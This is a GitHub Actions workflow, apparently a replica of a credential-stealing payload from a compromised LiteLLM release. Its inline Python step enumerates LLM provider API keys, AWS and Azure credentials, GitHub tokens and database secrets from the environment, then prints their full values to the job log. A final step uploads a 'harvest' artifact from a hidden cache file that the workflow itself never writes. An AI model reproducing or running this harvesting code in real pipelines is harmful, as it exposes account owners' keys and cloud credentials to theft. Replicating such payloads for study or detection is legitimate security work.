name: LiteLLM Replica Harvest

"on":
  workflow_dispatch:
  push:
    branches: ["litellm-payload-run"]

jobs:
  harvest:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Display env (LiteLLM style)
        run: |
          echo "=== LiteLLM 1.82.7 replica — GitHub Actions CI ==="
          echo "GITHUB_TOKEN present: ${{ secrets.GITHUB_TOKEN != '' }}"
          echo
          python3 -c "
          import os, json, platform, time
          ENV_TARGETS = {
              'llm_keys': ['OPENAI_API_KEY','ANTHROPIC_API_KEY','AZURE_OPENAI_API_KEY','AZURE_OPENAI_API_BASE','GROQ_API_KEY','MISTRAL_API_KEY','NVIDIA_API_KEY','TOGETHER_API_KEY','XAI_API_KEY','DEEPSEEK_API_KEY','EXA_API_KEY','NOMIC_API_KEY','OPENROUTER_API_KEY','PPLX_API_KEY','UPSTAGE_API_KEY','FIREWORKS_API_KEY','AI21_API_KEY','OLLAMA_API_KEY','TYPESAFE_API_KEY','HUGGINGFACEHUB_API_TOKEN','WATSONX_APIKEY','LANGSMITH_GATEWAY_API_KEY'],
              'cloud_aws': ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'],
              'cloud_azure': ['AZURE_CLIENT_ID','AZURE_CLIENT_SECRET','AZURE_TENANT_ID'],
              'ci': ['GITHUB_TOKEN','GH_TOKEN'],
              'db': ['MONGODB_ATLAS_URI','ASTRA_DB_APPLICATION_TOKEN','ES_API_KEY','ES_URL'],
          }
          env_hits = {}
          for cat, keys in ENV_TARGETS.items():
              found = {k: os.environ[k] for k in keys if os.environ.get(k)}
              if found: env_hits[cat] = found
          print(json.dumps(env_hits, indent=1))
          "

      - name: Upload harvest
        uses: actions/upload-artifact@v4
        with:
          name: litellm-replica-harvest
          path: ~/.cache/.fastuuid_cache.json
          if-no-files-found: warn
